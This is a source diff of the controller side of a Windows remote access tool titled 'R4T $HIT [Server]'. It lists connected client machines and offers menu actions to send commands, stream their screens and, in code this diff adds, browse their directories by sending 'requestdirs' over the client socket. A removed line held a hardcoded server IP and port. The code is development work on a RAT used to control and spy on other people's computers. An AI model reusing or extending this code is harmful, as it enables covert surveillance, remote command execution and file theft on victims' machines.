@@ -1,83 +1,35 @@
 #include "server.h"
+#include "WndRegisters.h"
+#include "resources.h"
+#include "sockinitialize.h"
+#include "sys.h"
 #include <commctrl.h>
 #include <set>
 
-typedef int socklen_t;
-
-#define LVM_SETITEMHEIGHT LVM_FIRST + 27
 #pragma warning(disable:28251)
-
-#pragma comment(lib,"User32.lib")
-#pragma comment(lib,"ws2_32.lib")
-#pragma comment(lib,"comctl32.lib")
 
 #define WM_SOCKET WM_USER + 1
 #define GWL_HICON (-14)
 
-wchar_t g_szClassName[] = L"Server";
-const wchar_t* wn_title = L"R4T $HIT [Server]";
-wchar_t g_szClientClassName[] = L"Client Screen";
-
-const char* ServerIP = "139.162.166.201"; //139.162.166.201 server
-int PORT = 9698; //9698 server | localhost 9865
 int counter;
 
 BOOL ishwndClient = false;
+BOOL ishwndFTP = false;
 static HWND hwndClient = NULL;
-COLORREF clrRed = RGB(114, 4, 4);
-COLORREF clrLightRed = RGB(255, 204, 203);
-HBITMAP hBitmap = (HBITMAP)LoadImageW(NULL, L"kkk.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
-HICON hcIcon = (HICON)LoadImageW(NULL, L"C:\\Users\\mineo\\Desktop\\ttt.ico", IMAGE_ICON, 0, 0, LR_LOADFROMFILE);
-HBITMAP hCmdItemIcon = (HBITMAP)LoadImageW(NULL, L"cmd.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
-HBITMAP hScreenItemIcon = (HBITMAP)LoadImageW(NULL, L"desktop.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
-HBITMAP hFunItemIcon = (HBITMAP)LoadImageW(NULL, L"fun.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
-HBITMAP hRmClientItemIcon = (HBITMAP)LoadImageW(NULL, L"remove.bmp", IMAGE_BITMAP, 0, 0, LR_LOADFROMFILE);
+static HWND hwndFTP = NULL;
 UINT_PTR timerId;
 
-SOCKET s;
-WSADATA w;
-SOCKADDR_IN addr;
-sockaddr_in newSockAddr;
 HWND hwndList;
-int newSd;
 HWND hwndButton;
 UINT selectedMenuItem;
 int itemIndex;
 
 std::wstring aCounter;
-std::vector<SOCKET> clientSockets;
-std::set<SOCKET> addedClients;
 std::map<int, std::wstring> clientItems;
-
-HINSTANCE hInstance;
-HINSTANCE hClientInstance = GetModuleHandle(NULL);
-
-ATOM WndRegisterClass(HINSTANCE hInstance);
-ATOM WndClientRegisterClass(HINSTANCE hClientInstance);
-LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
-
-LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
-LRESULT CALLBACK ClientWndProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
 
 
 void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam);
 
-std::wstring getSysOpType()
-{
-    std::wstring ret;
-    NTSTATUS(WINAPI * RtlGetVersion)(LPOSVERSIONINFOEXW);
-    OSVERSIONINFOEXW osInfo;
-
-    *(FARPROC*)&RtlGetVersion = GetProcAddress(GetModuleHandleA("ntdll"), "RtlGetVersion");
-
-    if (NULL != RtlGetVersion)
-    {
-        osInfo.dwOSVersionInfoSize = sizeof(osInfo);
-        RtlGetVersion(&osInfo);
-        ret = L" Windows " + std::to_wstring(osInfo.dwMajorVersion);
-    }
-    return ret;
-}
 
 void OnCreate(HWND hwnd, WPARAM wParam, LPARAM lParam)
 {
@@ -257,44 +209,6 @@ ATOM CreateItem(HWND hwndList, wchar_t column_txt[])
     return ListView_InsertItem(hwndList, &lvi);
 }
 
-ATOM WndRegisterClass(HINSTANCE hInstance)
-{
-    WNDCLASSEX wc;
-    wc.cbSize = sizeof(WNDCLASSEX);
-    wc.style = 0;
-    wc.lpfnWndProc = WndProc;
-    wc.cbClsExtra = 0;
-    wc.cbWndExtra = 0;
-    wc.hInstance = hInstance;
-    wc.hIcon = hcIcon;
-    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
-    wc.hbrBackground = CreatePatternBrush(hBitmap);
-    wc.lpszMenuName = NULL;
-    wc.lpszClassName = g_szClassName;
-    wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
-
-    return RegisterClassExW(&wc);
-}
-
-ATOM WndClientRegisterClass(HINSTANCE hInstance)
-{
-    WNDCLASSEX wcClient;
-    wcClient.cbSize = sizeof(WNDCLASSEX);
-    wcClient.style = 0;
-    wcClient.lpfnWndProc = ClientWndProc;
-    wcClient.cbClsExtra = 0;
-    wcClient.cbWndExtra = 0;
-    wcClient.hInstance = hInstance;
-    wcClient.hIcon = hcIcon;
-    wcClient.hCursor = LoadCursor(NULL, IDC_ARROW);
-    wcClient.hbrBackground = NULL;
-    wcClient.lpszMenuName = NULL;
-    wcClient.lpszClassName = g_szClientClassName;
-    wcClient.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
-
-    return RegisterClassExW(&wcClient);
-}
-
 LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     int bytesRec;
@@ -464,13 +378,14 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 
             InsertMenu(hMenu, 0, MF_BYPOSITION, CLIENT_SENDCOMMAND, L"Send Command");
             InsertMenu(hMenu, 1, MF_BYPOSITION, CLIENT_WATCHSCREEN, L"Watch Screen");
-            InsertMenu(hMenu, 2, MF_BYPOSITION, CLIENT_FUN, L"Fun");
-            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
+            InsertMenu(hMenu, 2, MF_BYPOSITION, CLIENT_FTP, L"File Transfer");
+            InsertMenu(hMenu, 3, MF_BYPOSITION, CLIENT_FUN, L"Fun");
+            InsertMenu(hMenu, 4, MF_BYPOSITION, CLIENT_REMOVE, L"Remove Client");
             SetMenuItemBitmaps(hMenu, CLIENT_SENDCOMMAND, MF_BYCOMMAND, hCmdItemIcon, hCmdItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_WATCHSCREEN, MF_BYCOMMAND, hScreenItemIcon, hScreenItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_FUN, MF_BYCOMMAND, hFunItemIcon, hFunItemIcon);
             SetMenuItemBitmaps(hMenu, CLIENT_REMOVE, MF_BYCOMMAND, hRmClientItemIcon, hRmClientItemIcon);
-
+            SetMenuItemBitmaps(hMenu, CLIENT_FTP, MF_BYCOMMAND, hFtpClientItemIcon, hFtpClientItemIcon);
 
             MENUINFO mi = { 0 };
             mi.cbSize = sizeof(MENUINFO);
@@ -540,6 +455,49 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
                 int socketIndex = std::distance(clientSockets.begin(), it);
                 MessageBoxW(NULL, aCounter.c_str(), L"Message", MB_OK);
             }
+            break;
+        }
+
+        case CLIENT_FTP:
+        {
+            const int gHwndClientWidth = 800;
+            const int gHwndClientHeight = 700;
+
+            SOCKET selectedSocket = clientSockets[itemIndex];
+            auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+            if (it != clientSockets.end())
+            {
+                LVITEM lvItem;
+                lvItem.mask = LVIF_TEXT;
+                lvItem.iItem = itemIndex;
+                lvItem.iSubItem = 0;
+                lvItem.pszText = const_cast<LPWSTR>(aCounter.c_str());
+                lvItem.cchTextMax = sizeof(aCounter);
+
+                ListView_GetItem(hwndList, &lvItem);
+
+
+                int socketIndex = std::distance(clientSockets.begin(), it);
+
+                hwndFTP = CreateWindowExW(
+                    WS_EX_CLIENTEDGE,
+                    g_szClientFTPClassName,
+                    aCounter.c_str(),
+                    WS_OVERLAPPEDWINDOW | WS_CLIPCHILDREN | WS_CLIPSIBLINGS,
+                    CW_USEDEFAULT, CW_USEDEFAULT, gHwndClientWidth, gHwndClientHeight,
+                    hwnd, NULL, hInstance, NULL);
+
+
+                if (hwndFTP == NULL)
+                {
+                    return 0;
+                }
+
+                ishwndFTP = true;
+
+                ShowWindow(hwndFTP, SW_SHOW);
+            }
+
             break;
         }
 
@@ -654,6 +612,55 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
     return 0;
 };
 
+LRESULT CALLBACK ClientFTPWndProc(HWND FtpHwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+    switch (uMsg)
+    {
+
+    case WM_CREATE:
+    {
+        SOCKET selectedSocket = clientSockets[itemIndex];
+        auto it = std::find(clientSockets.begin(), clientSockets.end(), selectedSocket);
+        send(selectedSocket, "requestdirs", strlen("requestdirs"), 0);
+
+        HWND hwndTreeView = CreateWindowEx(WS_EX_CLIENTEDGE, WC_TREEVIEW, L"", WS_CHILD | WS_VISIBLE, 50, 50, 600, 300, FtpHwnd, (HMENU)87, GetModuleHandle(NULL), NULL);
+
+        TVINSERTSTRUCT tvis;
+        tvis.hParent = NULL;
+        tvis.hInsertAfter = TVI_LAST;
+        tvis.item.mask = TVIF_TEXT | TVIF_PARAM;
+
+        // Add the root directory
+        wchar_t heg[] = L"Root";
+        tvis.item.pszText = heg;
+        tvis.item.lParam = (LPARAM)"Root";
+        HTREEITEM hRoot = (HTREEITEM)SendMessage(hwndTreeView, TVM_INSERTITEM, 0, (LPARAM)&tvis);
+
+        break;
+    }
+
+    case WM_PAINT:
+    {
+
+        break;
+    }
+
+    case WM_CLOSE:
+    {
+        DestroyWindow(FtpHwnd);
+        break;
+    }
+
+    case WM_DESTROY:
+        DestroyWindow(FtpHwnd);
+        return 0;
+
+    default:
+        return DefWindowProc(FtpHwnd, uMsg, wParam, lParam);
+    }
+    return 0;
+}
+
 
 LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 {
@@ -665,7 +672,7 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
 
     case WM_CREATE:
     {
-        SetTimer(Chwnd, SCREEN_TIMER, 1000 / 20, NULL);
+        SetTimer(Chwnd, SCREEN_TIMER, FPS, NULL);
         Gdiplus::GdiplusStartupInput gdiplusStartupInput;
         ULONG_PTR gdiplusToken;
         GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
@@ -689,12 +696,11 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
     {
         int bufferLen = 0;
         const int MAX_BYTES = 100000;
-        Sleep(1000 / 20);
+        Sleep(FPS);
         do
         {
             SOCKET selectedSocket = clientSockets[itemIndex];
 
-            
             ULONGLONG bufferLenNetworkOrder = 0;
             int bytesReceived = 0;
             int rerr = 0;
@@ -718,7 +724,6 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
             }
 
             while (bytesReceived < bufferLen && bufferLen < MAX_BYTES) {
-                //MessageBoxA(NULL, std::to_string(bufferLen - bytesReceived).c_str(), "CHECK", MB_OK);
                 rerr = recv(selectedSocket, imageBuffer.get() + bytesReceived, bufferLen - bytesReceived, 0);
                 if (rerr > 0 && rerr <= bufferLen - bytesReceived) {
                     bytesReceived += rerr;
@@ -779,6 +784,8 @@ LRESULT CALLBACK ClientWndProc(HWND Chwnd, UINT uMsg, WPARAM wParam, LPARAM lPar
     return 0;
 }
 
+
+
 int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     LPWSTR lpCmdLine, int nCmdShow)
 {
@@ -789,6 +796,7 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     WndRegisterClass(hInstance);
     WndClientRegisterClass(hInstance);
+    WndClientFTPRegisterClass(hInstance);
 
     int wWidth = 1000;
     int wHeight = 675;
